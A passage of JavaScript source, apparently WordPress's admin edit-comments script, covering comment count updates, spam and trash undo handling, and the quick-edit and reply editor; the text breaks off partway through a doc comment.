/**
 * Handles updating and editing comments.
 *
 * @file This file contains functionality for the admin comments page.
 * @since 2.1.0
 * @output wp-admin/js/edit-comments.js
 */

/* global adminCommentsSettings, thousandsSeparator, list_args, QTags, ajaxurl, wpAjax */
/* global commentReply, theExtraList, theList, setCommentsList */

(function($) {
var getCount, updateCount, updateCountText, updatePending, updateApproved,
	updateHtmlTitle, updateDashboardText, updateInModerationText, adminTitle = document.title,
	isDashboard = $('#dashboard_right_now').length,
	titleDiv, titleRegEx,
	__ = wp.i18n.__;

	/**
	 * Extracts a number from the content of a jQuery element.
	 *
	 * @since 2.9.0
	 * @access private
	 *
	 * @param {jQuery} el jQuery element.
	 *
	 * @return {number} The number found in the given element.
	 */
	getCount = function(el) {
		var n = parseInt( el.html().replace(/[^0-9]+/g, ''), 10 );
		if ( isNaN(n) ) {
			return 0;
		}
		return n;
	};

	/**
	 * Updates an html element with a localized number string.
	 *
	 * @since 2.9.0
	 * @access private
	 *
	 * @param {jQuery} el The jQuery element to update.
	 * @param {number} n Number to be put in the element.
	 *
	 * @return {void}
	 */
	updateCount = function(el, n) {
		var n1 = '';
		if ( isNaN(n) ) {
			return;
		}
		n = n < 1 ? '0' : n.toString();
		if ( n.length > 3 ) {
			while ( n.length > 3 ) {
				n1 = thousandsSeparator + n.substr(n.length - 3) + n1;
				n = n.substr(0, n.length - 3);
			}
			n = n + n1;
		}
		el.html(n);
	};

	/**
	 * Updates the number of approved comments on a specific post and the filter bar.
	 *
	 * @since 4.4.0
	 * @access private
	 *
	 * @param {number} diff The amount to lower or raise the approved count with.
	 * @param {number} commentPostId The ID of the post to be updated.
	 *
	 * @return {void}
	 */
	updateApproved = function( diff, commentPostId ) {
		var postSelector = '.post-com-count-' + commentPostId,
			noClass = 'comment-count-no-comments',
			approvedClass = 'comment-count-approved',
			approved,
			noComments;

		updateCountText( 'span.approved-count', diff );

		if ( ! commentPostId ) {
			return;
		}

		// Cache selectors to not get duplicates.
		approved = $( 'span.' + approvedClass, postSelector );
		noComments = $( 'span.' + noClass, postSelector );

		approved.each(function() {
			var a = $(this), n = getCount(a) + diff;
			if ( n < 1 )
				n = 0;

			if ( 0 === n ) {
				a.removeClass( approvedClass ).addClass( noClass );
			} else {
				a.addClass( approvedClass ).removeClass( noClass );
			}
			updateCount( a, n );
		});

		noComments.each(function() {
			var a = $(this);
			if ( diff > 0 ) {
				a.removeClass( noClass ).addClass( approvedClass );
			} else {
				a.addClass( noClass ).removeClass( approvedClass );
			}
			updateCount( a, diff );
		});
	};

	/**
	 * Updates a number count in all matched HTML elements
	 *
	 * @since 4.4.0
	 * @access private
	 *
	 * @param {string} selector The jQuery selector for elements to update a count
	 *                          for.
	 * @param {number} diff The amount to lower or raise the count with.
	 *
	 * @return {void}
	 */
	updateCountText = function( selector, diff ) {
		$( selector ).each(function() {
			var a = $(this), n = getCount(a) + diff;
			if ( n < 1 ) {
				n = 0;
			}
			updateCount( a, n );
		});
	};

	/**
	 * Updates a text about comment count on the dashboard.
	 *
	 * @since 4.4.0
	 * @access private
	 *
	 * @param {Object} response Ajax response from the server that includes a
	 *                          translated "comment count" message.
	 *
	 * @return {void}
	 */
	updateDashboardText = function( response ) {
		if ( ! isDashboard || ! response || ! response.i18n_comments_text ) {
			return;
		}

		$( '.comment-count a', '#dashboard_right_now' ).text( response.i18n_comments_text );
	};

	/**
	 * Updates the "comments in moderation" text across the UI.
	 *
	 * @since 5.2.0
	 *
	 * @param {Object} response Ajax response from the server that includes a
	 *                          translated "comments in moderation" message.
	 *
	 * @return {void}
	 */
	updateInModerationText = function( response ) {
		if ( ! response || ! response.i18n_moderation_text ) {
			return;
		}

		// Update the "comment in moderation" text across the UI.
		$( '.comments-in-moderation-text' ).text( response.i18n_moderation_text );
		// Hide the "comment in moderation" text in the Dashboard "At a Glance" widget.
		if ( isDashboard && response.in_moderation ) {
			$( '.comment-mod-count', '#dashboard_right_now' )
				[ response.in_moderation > 0 ? 'removeClass' : 'addClass' ]( 'hidden' );
		}
	};

	/**
	 * Updates the title of the document with the number comments to be approved.
	 *
	 * @since 4.4.0
	 * @access private
	 *
	 * @param {number} diff The amount to lower or raise the number of to be
	 *                      approved comments with.
	 *
	 * @return {void}
	 */
	updateHtmlTitle = function( diff ) {
		var newTitle, regExMatch, titleCount, commentFrag;

		/* translators: %s: Comments count. */
		titleRegEx = titleRegEx || new RegExp( __( 'Comments (%s)' ).replace( '%s', '\\([0-9' + thousandsSeparator + ']+\\)' ) + '?' );
		// Count funcs operate on a $'d element.
		titleDiv = titleDiv || $( '<div />' );
		newTitle = adminTitle;

		commentFrag = titleRegEx.exec( document.title );
		if ( commentFrag ) {
			commentFrag = commentFrag[0];
			titleDiv.html( commentFrag );
			titleCount = getCount( titleDiv ) + diff;
		} else {
			titleDiv.html( 0 );
			titleCount = diff;
		}

		if ( titleCount >= 1 ) {
			updateCount( titleDiv, titleCount );
			regExMatch = titleRegEx.exec( document.title );
			if ( regExMatch ) {
				/* translators: %s: Comments count. */
				newTitle = document.title.replace( regExMatch[0], __( 'Comments (%s)' ).replace( '%s', titleDiv.text() ) + ' ' );
			}
		} else {
			regExMatch = titleRegEx.exec( newTitle );
			if ( regExMatch ) {
				newTitle = newTitle.replace( regExMatch[0], __( 'Comments' ) );
			}
		}
		document.title = newTitle;
	};

	/**
	 * Updates the number of pending comments on a specific post and the filter bar.
	 *
	 * @since 3.2.0
	 * @access private
	 *
	 * @param {number} diff The amount to lower or raise the pending count with.
	 * @param {number} commentPostId The ID of the post to be updated.
	 *
	 * @return {void}
	 */
	updatePending = function( diff, commentPostId ) {
		var postSelector = '.post-com-count-' + commentPostId,
			noClass = 'comment-count-no-pending',
			noParentClass = 'post-com-count-no-pending',
			pendingClass = 'comment-count-pending',
			pending,
			noPending;

		if ( ! isDashboard ) {
			updateHtmlTitle( diff );
		}

		$( 'span.pending-count' ).each(function() {
			var a = $(this), n = getCount(a) + diff;
			if ( n < 1 )
				n = 0;
			a.closest('.awaiting-mod')[ 0 === n ? 'addClass' : 'removeClass' ]('count-0');
			updateCount( a, n );
		});

		if ( ! commentPostId ) {
			return;
		}

		// Cache selectors to not get dupes.
		pending = $( 'span.' + pendingClass, postSelector );
		noPending = $( 'span.' + noClass, postSelector );

		pending.each(function() {
			var a = $(this), n = getCount(a) + diff;
			if ( n < 1 )
				n = 0;

			if ( 0 === n ) {
				a.parent().addClass( noParentClass );
				a.removeClass( pendingClass ).addClass( noClass );
			} else {
				a.parent().removeClass( noParentClass );
				a.addClass( pendingClass ).removeClass( noClass );
			}
			updateCount( a, n );
		});

		noPending.each(function() {
			var a = $(this);
			if ( diff > 0 ) {
				a.parent().removeClass( noParentClass );
				a.removeClass( noClass ).addClass( pendingClass );
			} else {
				a.parent().addClass( noParentClass );
				a.addClass( noClass ).removeClass( pendingClass );
			}
			updateCount( a, diff );
		});
	};

/**
 * Initializes the comments list.
 *
 * @since 4.4.0
 *
 * @global
 *
 * @return {void}
 */
window.setCommentsList = function() {
	var totalInput, perPageInput, pageInput, dimAfter, delBefore, updateTotalCount, delAfter, refillTheExtraList, diff,
		lastConfidentTime = 0;

	totalInput = $('input[name="_total"]', '#comments-form');
	perPageInput = $('input[name="_per_page"]', '#comments-form');
	pageInput = $('input[name="_page"]', '#comments-form');

	/**
	 * Updates the total with the latest count.
	 *
	 * The time parameter makes sure that we only update the total if this value is
	 * a newer value than we previously received.
	 *
	 * The time and setConfidentTime parameters make sure that we only update the
	 * total when necessary. So a value that has been generated earlier will not
	 * update the total.
	 *
	 * @since 2.8.0
	 * @access private
	 *
	 * @param {number} total Total number of comments.
	 * @param {number} time Unix timestamp of response.
 	 * @param {boolean} setConfidentTime Whether to update the last confident time
	 *                                   with the given time.
	 *
	 * @return {void}
	 */
	updateTotalCount = function( total, time, setConfidentTime ) {
		if ( time < lastConfidentTime )
			return;

		if ( setConfidentTime )
			lastConfidentTime = time;

		totalInput.val( total.toString() );
	};

	/**
	 * Changes DOM that need to be changed after a list item has been dimmed.
	 *
	 * @since 2.5.0
	 * @access private
	 *
	 * @param {Object} r Ajax response object.
	 * @param {Object} settings Settings for the wpList object.
	 *
	 * @return {void}
	 */
	dimAfter = function( r, settings ) {
		var editRow, replyID, replyButton, response,
			c = $( '#' + settings.element );

		if ( true !== settings.parsed ) {
			response = settings.parsed.responses[0];
		}

		editRow = $('#replyrow');
		replyID = $('#comment_ID', editRow).val();
		replyButton = $('#replybtn', editRow);

		if ( c.is('.unapproved') ) {
			if ( settings.data.id == replyID )
				replyButton.text( __( 'Approve and Reply' ) );

			c.find( '.row-actions span.view' ).addClass( 'hidden' ).end()
				.find( 'div.comment_status' ).html( '0' );

		} else {
			if ( settings.data.id == replyID )
				replyButton.text( __( 'Reply' ) );

			c.find( '.row-actions span.view' ).removeClass( 'hidden' ).end()
				.find( 'div.comment_status' ).html( '1' );
		}

		diff = $('#' + settings.element).is('.' + settings.dimClass) ? 1 : -1;
		if ( response ) {
			updateDashboardText( response.supplemental );
			updateInModerationText( response.supplemental );
			updatePending( diff, response.supplemental.postId );
			updateApproved( -1 * diff, response.supplemental.postId );
		} else {
			updatePending( diff );
			updateApproved( -1 * diff  );
		}
	};

	/**
	 * Handles marking a comment as spam or trashing the comment.
	 *
	 * Is executed in the list delBefore hook.
	 *
	 * @since 2.8.0
	 * @access private
	 *
	 * @param {Object} settings Settings for the wpList object.
	 * @param {HTMLElement} list Comments table element.
	 *
	 * @return {Object} The settings object.
	 */
	delBefore = function( settings, list ) {
		var note, id, el, n, h, a, author,
			action = false,
			wpListsData = $( settings.target ).attr( 'data-wp-lists' );

		settings.data._total = totalInput.val() || 0;
		settings.data._per_page = perPageInput.val() || 0;
		settings.data._page = pageInput.val() || 0;
		settings.data._url = document.location.href;
		settings.data.comment_status = $('input[name="comment_status"]', '#comments-form').val();

		if ( wpListsData.indexOf(':trash=1') != -1 )
			action = 'trash';
		else if ( wpListsData.indexOf(':spam=1') != -1 )
			action = 'spam';

		if ( action ) {
			id = wpListsData.replace(/.*?comment-([0-9]+).*/, '$1');
			el = $('#comment-' + id);
			note = $('#' + action + '-undo-holder').html();

			el.find('.check-column :checkbox').prop('checked', false); // Uncheck the row so as not to be affected by Bulk Edits.

			if ( el.siblings('#replyrow').length && commentReply.cid == id )
				commentReply.close();

			if ( el.is('tr') ) {
				n = el.children(':visible').length;
				author = $('.author strong', el).text();
				h = $('<tr id="undo-' + id + '" class="undo un' + action + '" style="display:none;"><td colspan="' + n + '">' + note + '</td></tr>');
			} else {
				author = $('.comment-author', el).text();
				h = $('<div id="undo-' + id + '" style="display:none;" class="undo un' + action + '">' + note + '</div>');
			}

			el.before(h);

			$('strong', '#undo-' + id).text(author);
			a = $('.undo a', '#undo-' + id);
			a.attr('href', 'comment.php?action=un' + action + 'comment&c=' + id + '&_wpnonce=' + settings.data._ajax_nonce);
			a.attr('data-wp-lists', 'delete:the-comment-list:comment-' + id + '::un' + action + '=1');
			a.attr('class', 'vim-z vim-destructive aria-button-if-js');
			$('.avatar', el).first().clone().prependTo('#undo-' + id + ' .' + action + '-undo-inside');

			a.on( 'click', function( e ){
				e.preventDefault();
				e.stopPropagation(); // Ticket #35904.
				list.wpList.del(this);
				$('#undo-' + id).css( {backgroundColor:'#ceb'} ).fadeOut(350, function(){
					$(this).remove();
					$('#comment-' + id).css('backgroundColor', '').fadeIn(300, function(){ $(this).show(); });
				});
			});
		}

		return settings;
	};

	/**
	 * Handles actions that need to be done after marking as spam or thrashing a
	 * comment.
	 *
	 * The ajax requests return the unix time stamp a comment was marked as spam or
	 * trashed. We use this to have a correct total amount of comments.
	 *
	 * @since 2.5.0
	 * @access private
	 *
	 * @param {Object} r Ajax response object.
	 * @param {Object} settings Settings for the wpList object.
	 *
	 * @return {void}
	 */
	delAfter = function( r, settings ) {
		var total_items_i18n, total, animated, animatedCallback,
			response = true === settings.parsed ? {} : settings.parsed.responses[0],
			commentStatus = true === settings.parsed ? '' : response.supplemental.status,
			commentPostId = true === settings.parsed ? '' : response.supplemental.postId,
			newTotal = true === settings.parsed ? '' : response.supplemental,

			targetParent = $( settings.target ).parent(),
			commentRow = $('#' + settings.element),

			spamDiff, trashDiff, pendingDiff, approvedDiff,

			/*
			 * As `wpList` toggles only the `unapproved` class, the approved comment
			 * rows can have both the `approved` and `unapproved` classes.
			 */
			approved = commentRow.hasClass( 'approved' ) && ! commentRow.hasClass( 'unapproved' ),
			unapproved = commentRow.hasClass( 'unapproved' ),
			spammed = commentRow.hasClass( 'spam' ),
			trashed = commentRow.hasClass( 'trash' ),
			undoing = false; // Ticket #35904.

		updateDashboardText( newTotal );
		updateInModerationText( newTotal );

		/*
		 * The order of these checks is important.
		 * .unspam can also have .approve or .unapprove.
		 * .untrash can also have .approve or .unapprove.
		 */

		if ( targetParent.is( 'span.undo' ) ) {
			// The comment was spammed.
			if ( targetParent.hasClass( 'unspam' ) ) {
				spamDiff = -1;

				if ( 'trash' === commentStatus ) {
					trashDiff = 1;
				} else if ( '1' === commentStatus ) {
					approvedDiff = 1;
				} else if ( '0' === commentStatus ) {
					pendingDiff = 1;
				}

			// The comment was trashed.
			} else if ( targetParent.hasClass( 'untrash' ) ) {
				trashDiff = -1;

				if ( 'spam' === commentStatus ) {
					spamDiff = 1;
				} else if ( '1' === commentStatus ) {
					approvedDiff = 1;
				} else if ( '0' === commentStatus ) {
					pendingDiff = 1;
				}
			}

			undoing = true;

		// User clicked "Spam".
		} else if ( targetParent.is( 'span.spam' ) ) {
			// The comment is currently approved.
			if ( approved ) {
				approvedDiff = -1;
			// The comment is currently pending.
			} else if ( unapproved ) {
				pendingDiff = -1;
			// The comment was in the Trash.
			} else if ( trashed ) {
				trashDiff = -1;
			}
			// You can't spam an item on the Spam screen.
			spamDiff = 1;

		// User clicked "Unspam".
		} else if ( targetParent.is( 'span.unspam' ) ) {
			if ( approved ) {
				pendingDiff = 1;
			} else if ( unapproved ) {
				approvedDiff = 1;
			} else if ( trashed ) {
				// The comment was previously approved.
				if ( targetParent.hasClass( 'approve' ) ) {
					approvedDiff = 1;
				// The comment was previously pending.
				} else if ( targetParent.hasClass( 'unapprove' ) ) {
					pendingDiff = 1;
				}
			} else if ( spammed ) {
				if ( targetParent.hasClass( 'approve' ) ) {
					approvedDiff = 1;

				} else if ( targetParent.hasClass( 'unapprove' ) ) {
					pendingDiff = 1;
				}
			}
			// You can unspam an item on the Spam screen.
			spamDiff = -1;

		// User clicked "Trash".
		} else if ( targetParent.is( 'span.trash' ) ) {
			if ( approved ) {
				approvedDiff = -1;
			} else if ( unapproved ) {
				pendingDiff = -1;
			// The comment was in the spam queue.
			} else if ( spammed ) {
				spamDiff = -1;
			}
			// You can't trash an item on the Trash screen.
			trashDiff = 1;

		// User clicked "Restore".
		} else if ( targetParent.is( 'span.untrash' ) ) {
			if ( approved ) {
				pendingDiff = 1;
			} else if ( unapproved ) {
				approvedDiff = 1;
			} else if ( trashed ) {
				if ( targetParent.hasClass( 'approve' ) ) {
					approvedDiff = 1;
				} else if ( targetParent.hasClass( 'unapprove' ) ) {
					pendingDiff = 1;
				}
			}
			// You can't go from Trash to Spam.
			// You can untrash on the Trash screen.
			trashDiff = -1;

		// User clicked "Approve".
		} else if ( targetParent.is( 'span.approve:not(.unspam):not(.untrash)' ) ) {
			approvedDiff = 1;
			pendingDiff = -1;

		// User clicked "Unapprove".
		} else if ( targetParent.is( 'span.unapprove:not(.unspam):not(.untrash)' ) ) {
			approvedDiff = -1;
			pendingDiff = 1;

		// User clicked "Delete Permanently".
		} else if ( targetParent.is( 'span.delete' ) ) {
			if ( spammed ) {
				spamDiff = -1;
			} else if ( trashed ) {
				trashDiff = -1;
			}
		}

		if ( pendingDiff ) {
			updatePending( pendingDiff, commentPostId );
			updateCountText( 'span.all-count', pendingDiff );
		}

		if ( approvedDiff ) {
			updateApproved( approvedDiff, commentPostId );
			updateCountText( 'span.all-count', approvedDiff );
		}

		if ( spamDiff ) {
			updateCountText( 'span.spam-count', spamDiff );
		}

		if ( trashDiff ) {
			updateCountText( 'span.trash-count', trashDiff );
		}

		if (
			( ( 'trash' === settings.data.comment_status ) && !getCount( $( 'span.trash-count' ) ) ) ||
			( ( 'spam' === settings.data.comment_status ) && !getCount( $( 'span.spam-count' ) ) )
		) {
			$( '#delete_all' ).hide();
		}

		if ( ! isDashboard ) {
			total = totalInput.val() ? parseInt( totalInput.val(), 10 ) : 0;
			if ( $(settings.target).parent().is('span.undo') )
				total++;
			else
				total--;

			if ( total < 0 )
				total = 0;

			if ( 'object' === typeof r ) {
				if ( response.supplemental.total_items_i18n && lastConfidentTime < response.supplemental.time ) {
					total_items_i18n = response.supplemental.total_items_i18n || '';
					if ( total_items_i18n ) {
						$('.displaying-num').text( total_items_i18n.replace( '&nbsp;', String.fromCharCode( 160 ) ) );
						$('.total-pages').text( response.supplemental.total_pages_i18n.replace( '&nbsp;', String.fromCharCode( 160 ) ) );
						$('.tablenav-pages').find('.next-page, .last-page').toggleClass('disabled', response.supplemental.total_pages == $('.current-page').val());
					}
					updateTotalCount( total, response.supplemental.time, true );
				} else if ( response.supplemental.time ) {
					updateTotalCount( total, response.supplemental.time, false );
				}
			} else {
				updateTotalCount( total, r, false );
			}
		}

		if ( ! theExtraList || theExtraList.length === 0 || theExtraList.children().length === 0 || undoing ) {
			return;
		}

		theList.get(0).wpList.add( theExtraList.children( ':eq(0):not(.no-items)' ).remove().clone() );

		refillTheExtraList();

		animated = $( ':animated', '#the-comment-list' );
		animatedCallback = function() {
			if ( ! $( '#the-comment-list tr:visible' ).length ) {
				theList.get(0).wpList.add( theExtraList.find( '.no-items' ).clone() );
			}
		};

		if ( animated.length ) {
			animated.promise().done( animatedCallback );
		} else {
			animatedCallback();
		}
	};

	/**
	 * Retrieves additional comments to populate the extra list.
	 *
	 * @since 3.1.0
	 * @access private
	 *
	 * @param {boolean} [ev] Repopulate the extra comments list if true.
	 *
	 * @return {void}
	 */
	refillTheExtraList = function(ev) {
		var args = $.query.get(), total_pages = $('.total-pages').text(), per_page = $('input[name="_per_page"]', '#comments-form').val();

		if (! args.paged)
			args.paged = 1;

		if (args.paged > total_pages) {
			return;
		}

		if (ev) {
			theExtraList.empty();
			args.number = Math.min(8, per_page); // See WP_Comments_List_Table::prepare_items() in class-wp-comments-list-table.php.
		} else {
			args.number = 1;
			args.offset = Math.min(8, per_page) - 1; // Fetch only the next item on the extra list.
		}

		args.no_placeholder = true;

		args.paged ++;

		// $.query.get() needs some correction to be sent into an Ajax request.
		if ( true === args.comment_type )
			args.comment_type = '';

		args = $.extend(args, {
			'action': 'fetch-list',
			'list_args': list_args,
			'_ajax_fetch_list_nonce': $('#_ajax_fetch_list_nonce').val()
		});

		$.ajax({
			url: ajaxurl,
			global: false,
			dataType: 'json',
			data: args,
			success: function(response) {
				theExtraList.get(0).wpList.add( response.rows );
			}
		});
	};

	/**
	 * Globally available jQuery object referring to the extra comments list.
	 *
	 * @global
	 */
	window.theExtraList = $('#the-extra-comment-list').wpList( { alt: '', delColor: 'none', addColor: 'none' } );

	/**
	 * Globally available jQuery object referring to the comments list.
	 *
	 * @global
	 */
	window.theList = $('#the-comment-list').wpList( { alt: '', delBefore: delBefore, dimAfter: dimAfter, delAfter: delAfter, addColor: 'none' } )
		.on('wpListDelEnd', function(e, s){
			var wpListsData = $(s.target).attr('data-wp-lists'), id = s.element.replace(/[^0-9]+/g, '');

			if ( wpListsData.indexOf(':trash=1') != -1 || wpListsData.indexOf(':spam=1') != -1 )
				$('#undo-' + id).fadeIn(300, function(){ $(this).show(); });
		});
};

/**
 * Object containing functionality regarding the comment quick editor and reply
 * editor.
 *
 * @since 2.7.0
 *
 * @global
 */
window.commentReply = {
	cid : '',
	act : '',
	originalContent : '',

	/**
	 * Initializes the comment reply functionality.
	 *
	 * @since 2.7.0
	 *
	 * @memberof commentReply
	 */
	init : function() {
		var row = $('#replyrow');

		$( '.cancel', row ).on( 'click', function() { return commentReply.revert(); } );
		$( '.save', row ).on( 'click', function() { return commentReply.send(); } );
		$( 'input#author-name, input#author-email, input#author-url', row ).on( 'keypress', function( e ) {
			if ( e.which == 13 ) {
				commentReply.send();
				e.preventDefault();
				return false;
			}
		});

		// Add events.
		$('#the-comment-list .column-comment > p').on( 'dblclick', function(){
			commentReply.toggle($(this).parent());
		});

		$('#doaction, #post-query-submit').on( 'click', function(){
			if ( $('#the-comment-list #replyrow').length > 0 )
				commentReply.close();
		});

		this.comments_listing = $('#comments-form > input[name="comment_status"]').val() || '';
	},

	/**
	 * Adds doubleclick event handler to the given comment list row.
	 *
	 * The double-click event will toggle the comment edit or reply form.
	 *
	 * @since 2.7.0
	 *
	 * @memberof commentReply
	 *
	 * @param {Object} r The row to add double click handlers to.
	 *
	 * @return {void}
	 */
	addEvents : function(r) {
		r.each(function() {
			$(this).find('.column-comment > p').on( 'dblclick', function(){
				commentReply.toggle($(this).parent());
			});
		});
	},

	/**
	 * Opens the quick edit for the given element.
	 *
	 * @since 2.7.0
	 *
	 * @memberof commentReply
	 *
	 * @param {HTMLElement} el The element you want to open the quick editor for.
	 *
	 * @return {void}
	 */
	toggle : function(el) {
		if ( 'none' !== $( el ).css( 'display' ) && ( $( '#replyrow' ).parent().is('#com-reply') || window.confirm( __( 'Are you sure you want to edit this comment?\nThe changes you made will be lost.' ) ) ) ) {
			$( el ).find( 'button.vim-q' ).trigger( 'click' );
		}
	},

	/**
	 * Closes the comment quick edit or reply form and undoes any changes.
	 *
	 * @since 2.7.0
	 *
	 * @memberof commentReply
	 *
	 * @return {void}
	 */
	revert : function() {

		if ( $('#the-comment-list #replyrow').length < 1 )
			return false;

		$('#replyrow').fadeOut('fast', function(){
			commentReply.close();
		});
	},

	/**
	 * Closes the comment quick edit or reply form and undoes any changes.
	 *
	 * @since 2.7.0
	 *
	 * @memberof commentReply
	 *
	 * @return {void}
	 */
	close : function() {
		var commentRow = $(),
			replyRow = $( '#replyrow' );

		// Return if the replyrow is not showing.
		if ( replyRow.parent().is( '#com-reply' ) ) {
			return;
		}

		if ( this.cid ) {
			commentRow = $( '#comment-' + this.cid );
		}

		/*
		 * When closing the Quick Edit form, show the comment row and move focus
		 * back to the Quick Edit button.
		 */
		if ( 'edit-comment' === this.act ) {
			commentRow.fadeIn( 300, function() {
				commentRow
					.show()
					.find( '.vim-q' )
						.attr( 'aria-expanded', 'false' )
						.trigger( 'focus' );
			} ).css( 'backgroundColor', '' );
		}

		// When closing the Reply form, move focus back to the Reply button.
		if ( 'replyto-comment' === this.act ) {
			commentRow.find( '.vim-r' )
				.attr( 'aria-expanded', 'false' )
				.trigger( 'focus' );
		}

		// Reset the Quicktags buttons.
 		if ( typeof QTags != 'undefined' )
			QTags.closeAllTags('replycontent');

		$('#add-new-comment').css('display', '');

		replyRow.hide();
		$( '#com-reply' ).append( replyRow );
		$('#replycontent').css('height', '').val('');
		$('#edithead input').val('');
		$( '.notice-error', replyRow )
			.addClass( 'hidden' )
			.find( '.error' ).empty();
		$( '.spinner', replyRow ).removeClass( 'is-active' );

		this.cid = '';
		this.originalContent = '';
	},

	/**
	 * Opens the comment quick edit or reply form.
	 *
	 * @since 2.7.0
	 *
	 * @memberof commentReply
	 *
	 * @param {number} comment_id The comment ID to open an editor for.
	 * @param {number} post_id The post ID to open an editor for.
	 * @param {string} action The action to perform. Either 'edit' or 'replyto'.
	 *
	 * @return {boolean} Always false.
	 */
	open : function(comment_id, post_id, action) {
		var editRow, rowData, act, replyButton, editHeight,
			t = this,
			c = $('#comment-' + comment_id),
			h = c.height(),
			colspanVal = 0;

		if ( ! this.discardCommentChanges() ) {
			return false;
		}

		t.close();
		t.cid = comment_id;

		editRow = $('#replyrow');
		rowData = $('#inline-'+comment_id);
		action = action || 'replyto';
		act = 'edit' == action ? 'edit' : 'replyto';
		act = t.act = act + '-comment';
		t.originalContent = $('textarea.comment', rowData).val();
		colspanVal = $( '> th:visible, > td:visible', c ).length;

		// Make sure it's actually a table and there's a `colspan` value to apply.
		if ( editRow.hasClass( 'inline-edit-row' ) && 0 !== colspanVal ) {
			$( 'td', editRow ).attr( 'colspan', colspanVal );
		}

		$('#action', editRow).val(act);
		$('#comment_post_ID', editRow).val(post_id);
		$('#comment_ID', editRow).val(comment_id);

		if ( action == 'edit' ) {
			$( '#author-name', editRow ).val( $( 'div.author', rowData ).text() );
			$('#author-email', editRow).val( $('div.author-email', rowData).text() );
			$('#author-url', editRow).val( $('div.author-url', rowData).text() );
			$('#status', editRow).val( $('div.comment_status', rowData).text() );
			$('#replycontent', editRow).val( $('textarea.comment', rowData).val() );
			$( '#edithead, #editlegend, #savebtn', editRow ).show();
			$('#replyhead, #replybtn, #addhead, #addbtn', editRow).hide();

			if ( h > 120 ) {
				// Limit the maximum height when editing very long comments to make it more manageable.
				// The textarea is resizable in most browsers, so the user can adjust it if needed.
				editHeight = h > 500 ? 500 : h;
				$('#replycontent', editRow).css('height', editHeight + 'px');
			}

			c.after( editRow ).fadeOut('fast', function(){
				$('#replyrow').fadeIn(300, function(){ $(this).show(); });
			});
		} else if ( action == 'add' ) {
			$('#addhead, #addbtn', editRow).show();
			$( '#replyhead, #replybtn, #edithead, #editlegend, #savebtn', editRow ) .hide();
			$('#the-comment-list').prepend(editRow);
			$('#replyrow').fadeIn(300);
		} else {
			replyButton = $('#replybtn', editRow);
			$( '#edithead, #editlegend, #savebtn, #addhead, #addbtn', editRow ).hide();
			$('#replyhead, #replybtn', editRow).show();
			c.after(editRow);

			if ( c.hasClass('unapproved') ) {
				replyButton.text( __( 'Approve and Reply' ) );
			} else {
				replyButton.text( __( 'Reply' ) );
			}

			$('#replyrow').fadeIn(300, function(){ $(this).show(); });
		}

		setTimeout(function() {
			var rtop, rbottom, scrollTop, vp, scrollBottom,
				isComposing = false;

			rtop = $('#replyrow').offset().top;
			rbottom = rtop + $('#replyrow').height();
			scrollTop = window.pageYOffset || document.documentElement.scrollTop;
			vp = document.documentElement.clientHeight || window.innerHeight || 0;
			scrollBottom = scrollTop + vp;

			if ( scrollBottom - 20 < rbottom )
				window.scroll(0, rbottom - vp + 35);
			else if ( rtop - 20 < scrollTop )
				window.scroll(0, rtop - 35);

			$( '#replycontent' )
				.trigger( 'focus' )
				.on( 'keyup', function( e ) {
					// Close on Escape except when Input Method Editors (IMEs) are in use.
					if ( e.which === 27 && ! isComposing ) {
						commentReply.revert();
					}
				} )
				.on( 'compositionstart', function() {
					isComposing = true;
				} );
		}, 600);

		return false;
	},

	/**
	 * Submits the comment quick edit or reply form.
	 *
	 * @since 2.7.0
	 *
	 * @memberof commentReply
	 *
	 * @return {void}
	 */
	send : function() {
		var post = {},
			$errorNotice = $( '#replysubmit .error-notice' );

		$errorNotice.addClass( 'hidden' );
		$( '#replysubmit .spinner' ).addClass( 'is-active' );

		$('#replyrow input').not(':button').each(function() {
			var t = $(this);
			post[ t.attr('name') ] = t.val();
		});

		post.content = $('#replycontent').val();
		post.id = post.comment_post_ID;
		post.comments_listing = this.comments_listing;
		post.p = $('[name="p"]').val();

		if ( $('#comment-' + $('#comment_ID').val()).hasClass('unapproved') )
			post.approve_parent = 1;

		$.ajax({
			type : 'POST',
			url : ajaxurl,
			data : post,
			success : function(x) { commentReply.show(x); },
			error : function(r) { commentReply.error(r); }
		});
	},

	/**
	 * Shows the new or updated comment or reply.
	 *
	 * This function needs to be passed the ajax result as received from the server.
	 * It will handle the response and show the comment that has just been saved to
	 * the server.
	 *
	 * @since 2.7.0
	 *
	 * @memberof commentReply
	 *
	 * @param {Object} xml Ajax response object.
	 *
	 * @return {void}
	 */
	show : function(xml) {
		var t = this, r, c, id, bg, pid;

		if ( typeof(xml) == 'string' ) {
			t.error({'responseText': xml});
			return false;
		}

		r = wpAjax.parseAjaxResponse(xml);
		if ( r.errors ) {
			t.error({'responseText': wpAjax.broken});
			return false;
		}

		t.revert();

		r = r.responses[0];
		id = '#comment-' + r.id;

		if ( 'edit-comment' == t.act )
			$(id).remove();

		if ( r.supplemental.parent_approved ) {
			pid = $('#comment-' + r.supplemental.parent_approved);
			updatePending( -1, r.supplemental.parent_post_id );

			if ( this.comments_listing == 'moderated' ) {
				pid.animate( { 'backgroundColor':'#CCEEBB' }, 400, function(){
					pid.fadeOut();
				});
				return;
			}
		}

		if ( r.supplemental.i18n_comments_text ) {
			updateDashboardText( r.supplemental );
			updateInModerationText( r.supplemental );
			updateApproved( 1, r.supplemental.parent_post_id );
			updateCountText( 'span.all-count', 1 );
		}

		r.data = r.data || '';
		c = r.data.toString().trim(); // Trim leading whitespaces.
		$(c).hide();
		$('#replyrow').after(c);

		id = $(id);
		t.addEvents(id);
		bg = id.hasClass('unapproved') ? '#FFFFE0' : id.closest('.widefat, .postbox').css('backgroundColor');

		id.animate( { 'backgroundColor':'#CCEEBB' }, 300 )
			.animate( { 'backgroundColor': bg }, 300, function() {
				if ( pid && pid.length ) {
					pid.animate( { 'backgroundColor':'#CCEEBB' }, 300 )
						.animate( { 'backgroundColor': bg }, 300 )
						.removeClass('unapproved').addClass('approved')
						.find('div.comment_status').html('1');
				}
			});

	},

	/**
	 * Shows an error for the failed comment update or reply.
	 *
	 * @since 2.7.0
	 *
	 * @memberof commentReply
	 *
	 * @param {string} r The Ajax response.
	 *
	 * @return {void}
	 */
	error : function(r) {
		var er = r.statusText,
			$errorNotice = $( '#replysubmit .notice-error' ),
			$error = $errorNotice.find( '.error' );

		$( '#replysubmit .spinner' ).removeClass( 'is-active' );

		if ( r.responseText )
			er = r.responseText.replace( /<.[^<>]*?>/g, '' );

		if ( er ) {
			$errorNotice.removeClass( 'hidden' );
			$error.html( er );
		}
	},

	/**
	 * Opens the add comments form in the comments metabox on the post edit page.
	 *
